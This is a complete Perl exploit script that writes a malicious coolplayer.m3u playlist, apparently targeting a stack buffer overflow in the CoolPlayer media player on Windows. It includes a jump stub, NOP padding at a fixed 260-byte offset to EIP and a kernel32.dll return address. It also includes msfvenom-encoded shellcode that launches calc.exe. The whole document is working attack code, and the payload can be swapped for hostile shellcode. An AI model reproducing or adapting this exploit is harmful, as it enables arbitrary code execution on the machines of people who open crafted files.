#!/usr/bin/perl

my $buffsize = 10000;					#set consistent buffer size

my $jmp = "\x83\xec\x64" x 2;				#SUB ESP, 100
$jmp = $jmp . "\x83\xec\x28";				#SUB ESP, 40
$jmp = $jmp . "\xff\xe4";				#JMP ESP

my $eip = pack('V', 0x7c80ef4b);			#call ebx from kernel32.dll
#my $eip = "\xcc" x 4;


# calc.exe payload [size 220]
# msfvenom -p windows/exec CMD=calc.exe -f perl -b "\x00\x0a\x0d\xff" -e x86/shikata_ga_nai
my $shellcode = 
"\xdd\xc5\xb8\xf2\x85\xba\xbe\xd9\x74\x24\xf4\x5a\x2b\xc9" .
"\xb1\x31\x83\xea\xfc\x31\x42\x14\x03\x42\xe6\x67\x4f\x42" .
"\xee\xea\xb0\xbb\xee\x8a\x39\x5e\xdf\x8a\x5e\x2a\x4f\x3b" .
"\x14\x7e\x63\xb0\x78\x6b\xf0\xb4\x54\x9c\xb1\x73\x83\x93" .
"\x42\x2f\xf7\xb2\xc0\x32\x24\x15\xf9\xfc\x39\x54\x3e\xe0" .
"\xb0\x04\x97\x6e\x66\xb9\x9c\x3b\xbb\x32\xee\xaa\xbb\xa7" .
"\xa6\xcd\xea\x79\xbd\x97\x2c\x7b\x12\xac\x64\x63\x77\x89" .
"\x3f\x18\x43\x65\xbe\xc8\x9a\x86\x6d\x35\x13\x75\x6f\x71" .
"\x93\x66\x1a\x8b\xe0\x1b\x1d\x48\x9b\xc7\xa8\x4b\x3b\x83" .
"\x0b\xb0\xba\x40\xcd\x33\xb0\x2d\x99\x1c\xd4\xb0\x4e\x17" .
"\xe0\x39\x71\xf8\x61\x79\x56\xdc\x2a\xd9\xf7\x45\x96\x8c" .
"\x08\x95\x79\x70\xad\xdd\x97\x65\xdc\xbf\xfd\x78\x52\xba" .
"\xb3\x7b\x6c\xc5\xe3\x13\x5d\x4e\x6c\x63\x62\x85\xc9\x9b" .
"\x28\x84\x7b\x34\xf5\x5c\x3e\x59\x06\x8b\x7c\x64\x85\x3e" .
"\xfc\x93\x95\x4a\xf9\xd8\x11\xa6\x73\x70\xf4\xc8\x20\x71" .
"\xdd\xaa\xa7\xe1\xbd\x02\x42\x82\x24\x5b";
 

my $nops = "\x90" x (260 - ((length($jmp) + length($shellcode)))); # 260 is offset to EIP
my $sploit = $jmp.$nops.$shellcode.$eip;		#exploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit)));	#fill remainder of buffer
my $buffer = $sploit.$fill;				#build final buffer

#write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";
